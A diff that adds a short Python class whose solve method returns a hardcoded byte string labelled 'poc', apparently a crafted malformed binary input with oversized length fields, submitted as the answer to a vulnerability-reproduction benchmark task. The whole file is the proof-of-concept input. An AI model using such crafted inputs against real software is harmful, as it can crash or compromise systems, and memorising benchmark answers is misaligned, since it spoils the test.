@@ -1,0 +1,11 @@
+class Solution:
+    def solve(self, src_path: str) -> bytes:
+        poc = (
+            b'\x01\x0d\x00\x48\x00\x00\x00\x00'
+            b'\xff\xff\xff\xff'
+            b'\xff\xff'
+            b'\x00\x38'
+            b'\xff\xff\x00\x38\x00\x00\x23\x20\x00\x00\x00\x1f'
+            b'\xff\xff\x00\x2c\x00\x00\x23\x20' + b'\x00' * 36
+        )
+        return poc
